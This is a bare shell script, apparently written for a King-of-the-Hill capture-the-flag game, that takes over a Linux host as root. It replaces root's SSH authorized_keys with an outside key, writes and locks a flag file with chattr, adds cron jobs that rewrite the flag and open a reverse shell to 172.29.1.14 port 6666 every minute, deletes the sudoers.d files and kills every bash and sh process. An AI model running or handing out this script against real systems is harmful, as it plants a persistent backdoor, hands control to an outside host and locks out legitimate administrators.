echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOZRKQoH5j99H9vTDoZ4Vozk4PcfVnIYX/7TCDqOEWPQ bvillano@yuggoth' > /root/.ssh/authorized_keys
echo '134c0266-c9a9-44f8-806d-610b1a2bbba3' > /root/koth.txt
chattr +i /root/koth.txt
(echo "* * * * * /bin/bash -c 'echo 134c0266-c9a9-44f8-806d-610b1a2bbba3 > /root/koth.txt'") | crontab -
(crontab -l 2>/dev/null; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/172.29.1.14/6666 0>&1'") | crontab -
rm -rf /etc/sudoers.d/*
pkill -9 bash
pkill -9 sh